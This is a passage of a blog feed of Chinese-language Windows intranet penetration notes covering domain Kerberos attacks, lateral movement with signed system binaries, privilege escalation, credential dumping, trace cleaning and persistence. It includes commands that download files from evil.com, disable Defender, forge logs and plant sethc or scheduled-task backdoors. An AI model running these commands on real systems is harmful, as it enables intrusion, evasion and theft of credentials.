title="证书模板"></a>证书模板</h2><p>微软提供了证书模板的功能，方便在域内签发证书。证书模板是注册策略和预定义证书设置的集合，包含证书有效期、用途、申请者等信息。</p><h2 id="证书注册"><a href="#证书注册" class="headerlink" title="证书注册"></a>证书注册</h2><p>证书可以通过以下几种方式注册：</p><p>通过 Windows 客户端证书注册协议 (MS-WCCE)<br>通过 ICertPassage 远程协议 (MS-ICPR)<br>在 ADCS 开启了对应 Web 服务的情况下，使用 Web 服务注册<br>在服务器安装了对应服务时，通过证书注册服务 (CES) 注册<br>在服务器安装了对应服务时，使用网络设备注册服务</p><h1 id="组策略-1"><a href="#组策略-1" class="headerlink" title="组策略"></a>组策略</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件。</p><p>组策略有以下功能：</p><p>管理注册表<br>设置脚本<br>重定向文件夹<br>管理应用程序<br>指定安全选项</p><h2 id="常用概念"><a href="#常用概念" class="headerlink" title="常用概念"></a>常用概念</h2><p>组策略容器 (Group Policy Container，GPC)存储在活动目录中，包含GPO属性、配置信息和版本等。可以通过GPC来查找GPT。</p><p>组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等。</p><p>其中GPC中的信息量少、容量小，GPT中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能。</p><p>组策略对象 (Group Policy Object, GPO) 是包含多种Windows组策略设置的集合，存储在GPC和GPT中。</p><h1 id="Kerberos的Windows实现"><a href="#Kerberos的Windows实现" class="headerlink" title="Kerberos的Windows实现"></a>Kerberos的Windows实现</h1><h2 id="相关定义"><a href="#相关定义" class="headerlink" title="相关定义"></a>相关定义</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>服务主体名称 (ServicePrincipal Names, SPN) ，是服务实例(如HTTP、SMB等)的唯一标识符。</p><p>SPN分为两种类型：一种是注册在活动目录的机器帐户下，当一个服务的权限为 Local System 或 Network Service，则SPN注册在机器帐户下。一种是注册在活动目录的域用户帐户下，当一个服务的权限为一个域用户，则SPN注册在域用户帐户下。</p><h1 id="域内攻击思路"><a href="#域内攻击思路" class="headerlink" title="域内攻击思路"></a>域内攻击思路</h1><ul><li><p>获取域控权限<br>通过域控相关漏洞<br>抓hash，尤其是域管理员、运维等高权限账号的哈希</p></li><li><p>控制入域机器<br>下发恶意策略控制<br>获取域内用户凭证<br>利用错误的域管理配置<br>域内relay</p></li><li><p>获取服务票据<br>攻击Exchange等服务器</p></li></ul><h1 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h1><h2 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h2><p>在认证过程中，经过client与AS的通信会得到TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据。</p><p>黄金票据利用需要与DC通信，且需要获取krbtgt的hash，但是可以获取任何Kerbose服务权限。</p><h2 id="白银票据利用"><a href="#白银票据利用" class="headerlink" title="白银票据利用"></a>白银票据利用</h2><p>白银票据（Silver Tickets）伪造利用的是Kerberos认证中的第三个步骤，在第三步的时候，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了，这里的ticket是基于client info、server session key、end time、server hash。这里client info已知，end time可以构造，server session key是TGS生成的，所以只要server的NTLM hash即可。银票伪造的是TGS，只能访问指定的服务。</p><h2 id="DCSync攻击"><a href="#DCSync攻击" class="headerlink" title="DCSync攻击"></a>DCSync攻击</h2><p>域内有多台域控服务器时，为了同步域控服务器的修改，微软提供了基于远程目录协议 DRSR 的同步机制。</p><p>在多个域控服务器之间，每隔一段时间会有一次域数据的同步。由需要同步的域控服务器向其它服务器发送 GetNCChanges 请求，请求中包含需要同步的数据。数据量较多时，则重复这个过程。</p><p>DCSync 就是使用这种机制进行域渗透的技术，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，在2015年添加到 mimikatz 的一个功能，可以导出域内所有用户的hash。</p><p>这种方式需要满足以下任一一种权限：</p><p>Administrators 组内的用户<br>Domain Admins 组内的用户<br>Enterprise Admins 组内的用户<br>域控制器的计算机帐户<br>或者拥有特定的几条 DACL:</p><p>DS-Replication-Get-Changes<br>DS-Replication-Get-Changes-All<br>DS-Replication-Get-Changes-In-Filtered-Set<br>当没有管理员用户，但是拥有 WriteDACL 权限时，可以写入上述 DACL 来完成 DCSync 。</p><p>对于这种攻击，可以通过检测 GetNCChanges 发起者的方式，如果由非域控机器发起对应请求，则可以认为是 DCSync 攻击。</p><h2 id="DCShadow攻击"><a href="#DCShadow攻击" class="headerlink" title="DCShadow攻击"></a>DCShadow攻击</h2><p>DCShadow是由来自法国的安全研究人员Benjamin Delpy和Vincent Le Toux在2018年的微软蓝帽（Blue Hat）大会上提出。</p><p>DCShadow攻击指在Active Directory环境下创建一个恶意的域控制器，并用它来推送恶意对象。</p><h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><p>哈希传递攻击（Pass-the-Hash，PTH）是通过传递NTLM哈希来认证的攻击方法，常用的工具有mimikatz等。</p><h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><p>票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用黄金票据和白银票据，通过PtT访问主机相当简单。</p><h2 id="Kerberoasting-Attacks"><a href="#Kerberoasting-Attacks" class="headerlink" title="Kerberoasting Attacks"></a>Kerberoasting Attacks</h2><p>Kerberoasting攻击由Tim Medin在2014 DerbyCon conference上 公开 。指域内的任何一台主机，都可以通过查询SPN，Kerberoasting即是向域内的所有服务请求TGS，然后进行暴力破解。</p><h3 id="Roasting-AS-REP"><a href="#Roasting-AS-REP" class="headerlink" title="Roasting AS-REP"></a>Roasting AS-REP</h3><p>该攻击枚举域中不需要Kerberos预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了 <code>DONT_REQ_PREAUTH</code> 。</p><h2 id="Kerberos-Delegation-Attacks"><a href="#Kerberos-Delegation-Attacks" class="headerlink" title="Kerberos Delegation Attacks"></a>Kerberos Delegation Attacks</h2><p>在一个域中，A使用Kerberos身份验证访问服务B，B再使用A的身份去访问C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务。</p><p>Kerberos Delegation（Kerberos委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限。</p><h2 id="其他漏洞利用"><a href="#其他漏洞利用" class="headerlink" title="其他漏洞利用"></a>其他漏洞利用</h2><p>域用户提权 (CVE-2022-26923)<br>KDC bamboozling (CVE-2021-42287)<br>Name impersonation (CVE-2021-42278)<br>ProxyShell (CVE-2021-34473)<br>ProxyLogon (CVE-2021-26855)<br>PrintNightmare (CVE-2021-1675 &#x2F; CVE-2021-34527)<br>SMBGhost (CVE-2020-0796)<br>Zerologon (CVE-2020-1472)<br>NTLM Relay (CVE-2019-1040)<br>永恒之蓝 (MS17-010)<br>域用户提权 (MS14-068)<br>Gpp漏洞 (MS14-025)<br>SAMR协议漏洞 (MS14-016)</p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><ul><li>使用ATA等商业化防护工具</li><li>安装杀毒软件、EDR等工具</li><li>关闭高危服务</li><li>统一配置防火墙策略</li><li>对域控等高危账号使用白名单进行行为管理</li><li>检测高危操作<br>权限提升<br>高危账号密码修改、重置</li><li>行为频率建模<br>对大量尝试登录&#x2F;信息查询进行报警</li><li>及时安装补丁</li><li>对特定攻击行为进行监控<br>通过GPO下发自启动、计划任务</li></ul>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="域渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows内网渗透之横向移动</title>
+    <link href="http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
+    <id>http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
+    <published>2023-08-23T16:00:00.000Z</published>
+    <updated>2023-08-25T07:50:10.090Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>获取权限后，横向移动以取得更多成果。</p><span id="more"></span><h1 id="常见入口"><a href="#常见入口" class="headerlink" title="常见入口"></a>常见入口</h1><ul><li>SMB弱密码</li><li>SqlServer弱密码</li></ul><h1 id="LOLBAS"><a href="#LOLBAS" class="headerlink" title="LOLBAS"></a>LOLBAS</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在2013年DerbyCon由Christopher Campbell和Matt Graeber发现，最终Philip Goh提出的概念。</p><p>这些程序一般有有Microsoft或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过UAC、绕过程序控制等。</p><h2 id="常见程序"><a href="#常见程序" class="headerlink" title="常见程序"></a>常见程序</h2><ul><li><p>appsyncvpublishing.exe<br>执行powershell</p></li><li><p>bitsadmin.exe<br>下载文件 <code>bitsadmin /transfer &lt;job_name&gt; /priority &lt;remote_path&gt; &lt;local_path&gt;</code><br>下载文件 <code>bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns</code><br>复制文件 <code>bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfoler\cmd.exe</code><br>代码执行 <code>bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe</code></p></li><li><p>cdb.exe</p></li><li><p>certutil.exe<br>可安装、备份、删除、管理和执行证书<br>证书存储相关功能<br>下载文件 <code>certuil -urlcache -split -f https://addr/example.exe</code><br>注意certutil是有cache的，需要显式删除<br>base64编解码 <code>certutil -encode</code> &#x2F; <code>certutil -decode</code></p></li><li><p>cmd.exe</p></li><li><p>cmstp.exe</p></li><li><p>control.exe<br>加载dll</p></li><li><p>csc.exe<br>编译C#载荷</p></li><li><p>cscript.exe<br>执行脚本</p></li><li><p>extexport.exe</p></li><li><p>expand.exe<br>展开一个或多个压缩文件</p></li><li><p>forfiles.exe<br><code>forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe</code></p></li><li><p>mofcomp.exe</p></li><li><p>makecab.exe</p></li><li><p>msbuild.exe<br>构建应用程序</p></li><li><p>mshta.exe<br>HTML应用</p></li><li><p>msxsl.exe<br>处理加载XSL程序</p></li><li><p>netsh.exe</p></li><li><p>installutil.exe<br>安装&#x2F;卸载程序组件</p></li><li><p>IEExec.exe<br>.NET Framework附带程序</p></li><li><p>powershell.exe</p></li><li><p>psexec.exe<br><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec">PsExec</a></p></li><li><p>reg.exe<br>注册表控制台</p></li><li><p>regedit.exe<br>注册表修改</p></li><li><p>regsvr32.exe<br>注册动态链接库&#x2F;ActiveX控件</p></li><li><p>rundll32.exe<br>执行DLL文件中的内部函数</p></li><li><p>sc.exe<br>查看服务状态管理</p></li><li><p>schtasks.exe<br>定时计划任务</p></li><li><p>shred<br>重复写入文件，防止文件恢复</p></li><li><p>type.exe<br>利用ads隐藏文件 <code>type &lt;filepath&gt; &lt;target_file:ads&gt;</code></p></li><li><p>wmic.exe<br>Windows管理工具</p></li><li><p>windbg.exe</p></li><li><p>winrm.exe</p></li><li><p>wscript.exe<br>脚本引擎</p></li><li><p>waitfor.exe<br>用于同步网络中计算机，可以发送或等待系统上的信号。</p></li></ul>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;获取权限后，横向移动以取得更多成果。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="横向移动" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
+    
+    
+    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows内网渗透之权限</title>
+    <link href="http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90/"/>
+    <id>http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90/</id>
+    <published>2023-08-23T16:00:00.000Z</published>
+    <updated>2023-08-25T07:50:21.954Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>获取权限，才能从外围进入核心。</p><span id="more"></span><h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>UAC(User Account Control)是Windows Vista和Windows Server 2008引入的一个安全机制，当一些敏感操作发生时，会跳出提示显示要求系统权限。</p><p>当用户登录Windows时，每个用户都会被授予一个access token，这个token中有security identifier(SID)的信息，决定了用户的权限。</p><h2 id="会触发UAC的操作"><a href="#会触发UAC的操作" class="headerlink" title="会触发UAC的操作"></a>会触发UAC的操作</h2><ul><li>以管理员权限启动应用</li><li>修改系统、UAC设置</li><li>修改没有权限的文件或目录（%SystemRoot% &#x2F; %ProgramFiles% 等）</li><li>修改ACL(access control list)</li><li>安装驱动</li><li>增删账户，修改账户类型，激活来宾用户</li></ul><h2 id="ByPass"><a href="#ByPass" class="headerlink" title="ByPass"></a>ByPass</h2><ul><li>DLL相关</li><li>进程注入</li><li>注册表</li></ul><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>权限提升有多种方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的UAF或是其他类似的漏洞，以获得较高权限。</p><p>逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。</p><h2 id="任意写文件利用"><a href="#任意写文件利用" class="headerlink" title="任意写文件利用"></a>任意写文件利用</h2><p>在Windows中用户可以写的敏感位置主要有以下这些：</p><ul><li>用户自身的文件和目录，包括<code>AppData</code> <code>Temp</code></li><li><code>C:\</code> , 默认情况下用户可以写入</li><li><code>C:\ProgramData</code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li><li><code>C:\Windows\Temp</code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li></ul><p>具体的ACL信息可用AccessChk，或Powershell的 <code>Get-Acl</code> 命令查看。</p><p>可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的dll，利用dll的加载执行来获取权限。</p><h2 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h2><p>MOF(Managed Object Format)是Windows系统的一个文件 <code>c:/windows/system32/wbem/mof/nullvert.mof</code><br>叫做“托管对象格式”，其作用是每隔5秒就会去监控进行创建和死亡。</p><p>当拥有文件上传的权限但是没有shell时，可以上传定制的mof文件至相应的位置，一定时间后这个mof就会被执行。</p><p>一般会采用在mof中加入一段添加管理员用户的命令的vbs脚本，当执行后就拥有了新的管理员账户。</p><h2 id="凭证窃取"><a href="#凭证窃取" class="headerlink" title="凭证窃取"></a>凭证窃取</h2><ul><li><p>Windows本地密码散列导出工具<br>mimikatz<br>lsass<br>wce<br>gsecdump<br>copypwd<br>Pwdump<br><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a></p></li><li><p>Windows本地密码破解工具<br>L0phtCrack<br>SAMInside<br>Ophcrack<br>彩虹表破解（<a href="https://www.zhihu.com/question/19790488">彩虹表</a>）<br>本机hash+明文抓取<br>win8+win2012明文抓取<br>ntds.dit的导出+QuarkPwDump读取分析<br>vssown.vbs+libesedb+NtdsXtract<br>ntdsdump<br>利用powershell(DSInternals)分析hash<br>使用 <code>net use \\%computername% /u:%username%</code> 重置密码尝试次数<br>限制读取时，可crash操作系统后，在蓝屏的dump文件中读取</p></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>组策略首选漏洞<br>DLL劫持<br>替换系统工具，实现后门<br>关闭defender <code>Set-MpPreference -disablerealtimeMonitoring $true</code></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;获取权限，才能从外围进入核心。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="权限" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90/"/>
+    
+    
+    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows内网渗透之痕迹清理</title>
+    <link href="http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
+    <id>http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/</id>
+    <published>2023-08-23T16:00:00.000Z</published>
+    <updated>2023-08-25T07:50:15.023Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透完毕后，需要对痕迹进行清理，以免被马上发现或轻松溯源。</p><span id="more"></span><h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><p>查看日志 <code>eventvwr</code><br>伪造日志 <code>eventcreate</code><br><strong>操作日志</strong></p><ul><li>3389登录列表</li><li>文件打开日志</li><li>文件修改日志</li><li>浏览器日志</li><li>系统事件</li><li>程序安装记录</li><li>程序删除记录</li><li>程序更新记录</li></ul><p><strong>登录日志</strong></p><ul><li>系统安全日志</li></ul><p><strong>日志路径</strong></p><ul><li>系统日志 <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></li><li>安全日志 <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></li><li>应用程序日志 <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></li></ul><p><strong>服务日志</strong></p><ul><li>IIS <code>%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</code></li></ul><h1 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h1><ul><li>AppCompatFlags</li><li>Background Activity Moderator(BAM)</li><li>MuiCache</li><li>RecentApps</li><li>RunMRU</li><li>ShimCache(AppCompatCache)</li></ul><h2 id="注册表键"><a href="#注册表键" class="headerlink" title="注册表键"></a>注册表键</h2><ul><li>HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog</li></ul><h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><h2 id="Prefetch"><a href="#Prefetch" class="headerlink" title="Prefetch"></a>Prefetch</h2><p>预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为PF。位置在 <code>C:\Windows\Prefetch</code></p><h2 id="JumpLists"><a href="#JumpLists" class="headerlink" title="JumpLists"></a>JumpLists</h2><p>记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件，位置在 <code>%AppData%\Microsoft\Windows\Recent</code></p><h2 id="Amcache-x2F-RecentFileCache-bcf"><a href="#Amcache-x2F-RecentFileCache-bcf" class="headerlink" title="Amcache&#x2F;RecentFileCache.bcf"></a>Amcache&#x2F;RecentFileCache.bcf</h2><p>Windows中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的事件和最后修改时间。</p><p>在Windows7、Windows Server 2008 R2等系统中，文件保存在 <code>C:\Windows\AppCompat\Programs\RecentFileCache.bcf</code> ，包含程序的创建时间、上次修改时间、上次访问时间和文件名。</p><p>在Windows8、Windows10、Windows Server 2012等系统中，文件保存在 <code>C:\Windows\AppCompat\Programs\Amcache.hve</code> ，包含文件大小、版本、sha1、二进制文件类型等信息。</p><h1 id="时间轴"><a href="#时间轴" class="headerlink" title="时间轴"></a>时间轴</h1><p>Windows时间轴是Windows 10在1803版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等。</p><h1 id="彻底删除"><a href="#彻底删除" class="headerlink" title="彻底删除"></a>彻底删除</h1><ul><li>多次覆写文件 <code>cipher /w:&lt;path&gt;</code></li><li>格式化某磁盘count次 <code>format D: /p:&lt;count&gt;</code></li></ul>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;渗透完毕后，需要对痕迹进行清理，以免被马上发现或轻松溯源。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="痕迹清理" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
+    
+    
+    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>一下子</title>
+    <link href="http://example.com/2023/08/22/Diary_20230822/"/>
+    <id>http://example.com/2023/08/22/Diary_20230822/</id>
+    <published>2023-08-21T16:00:00.000Z</published>
+    <updated>2023-08-22T16:26:18.231Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一下子就没写日记了。</p><span id="more"></span><h1 id="一瞬间"><a href="#一瞬间" class="headerlink" title="一瞬间"></a>一瞬间</h1><p>突然有了好几天没写日记，而我今天也不想写，反而只是在浪费时间。<br>感觉，就像弦突然断掉了一样。</p><p>但无论如何，还得坚持下去，有时虽然只是在说些无意义的话。</p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一下子就没写日记了。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
+    
+    
+    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
+    
+    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows内网渗透之持久化</title>
+    <link href="http://example.com/2023/08/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8C%81%E4%B9%85%E5%8C%96/"/>
+    <id>http://example.com/2023/08/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8C%81%E4%B9%85%E5%8C%96/</id>
+    <published>2023-08-21T16:00:00.000Z</published>
+    <updated>2023-08-25T07:50:26.784Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>进入内网后，要想办法保持权限。</p><span id="more"></span><h1 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h1><h2 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h2><p>创建系统隐藏文件：<br><code>attrib +s +a +r +h filename</code> &#x2F; <code>attrib +s +h filename</code><br>利用NTFS ADS(Alternate Data Streams)创建隐藏文件<br><strong>利用Windows保留字</strong>：<br><code>aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9</code></p><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><h3 id="sethc"><a href="#sethc" class="headerlink" title="sethc"></a>sethc</h3><p><code>sethc.exe</code> 是Windows系统在用户按下五次shift后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换 <code>sethc.exe</code> 的方式留下后门，在密码输入页面输入五次shift即可获得权限。</p><h3 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h3><p>在高版本的Windows中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。</p><p>具体操作为在注册表的<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft NT\CurrentVersion\Image File Execution Option</code> 下添加项 <code>sethc.exe</code> ，然后在 <code>sethc.exe</code> 这个项中添加 <code>debugger</code> 键，键值为恶意程序的路径。</p><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>Windows下有 <code>schtasks</code> 和 <code>at</code> 两种计划任务机制。其中 <code>at</code> 在较高版本的Windows中已经弃用。</p><p>设置命令为 <code>schtasks /create /tn &quot;TEST_OnLogon&quot; /sc onlogon /tr &quot;cmd.exe /c calc.exe&quot;</code> , <code>schtasks /create /tn &quot;TEST_OnStartup&quot; /ru system /tr &quot;cmd.exe /c calc.exe&quot;</code><br>删除命令为：<br><code>schtasks /delete /tn &quot;TEST_OnLogon&quot; /f</code></p><h3 id="登录脚本"><a href="#登录脚本" class="headerlink" title="登录脚本"></a>登录脚本</h3><p>Windows可以在用户登录前执行脚本，使用<br><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 设置。<br>也可在 <code>HKCU\Environment\</code> 路径下设置 <code>UserInitMprLogonScript</code> 来实现。</p><h3 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h3><p>Windows可以自定义屏幕保护程序，使用 <code>HKEY_CURRENT_USER\Control Panel\Desktop</code> 设置。</p><h3 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h3><p>Windows可以使用在用户名后加入 <code>$</code> 来创建隐藏用户，这种账户可在一定条件下隐藏，但是仍可以通过控制面板查看。<br>在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种创建方式创建的用户只能通过注册表查看。</p><h3 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h3><p>CLR(Common Language Runtime Compilation)公共语言运行时，是微软.NET产品构建的运行环境，可以粗略地理解为.NET虚拟机。<br>.NET程序的运行离不开CLR，因此可以通过劫持CLR的方式实现后门。</p><h3 id="Winlogon-Helper-DLL后门"><a href="#Winlogon-Helper-DLL后门" class="headerlink" title="Winlogon Helper DLL后门"></a>Winlogon Helper DLL后门</h3><p>Winlogon是一个Windows组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册定义在Windows登录期间启动哪些进程。所以可以依靠这个注册表进行权限维持。<br>注册表位置如下：<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> 用于执行exe程序<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 用于执行exe程序<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</code> 用于执行dll文件</p><h2 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h2><h3 id="基于注册表的自启动"><a href="#基于注册表的自启动" class="headerlink" 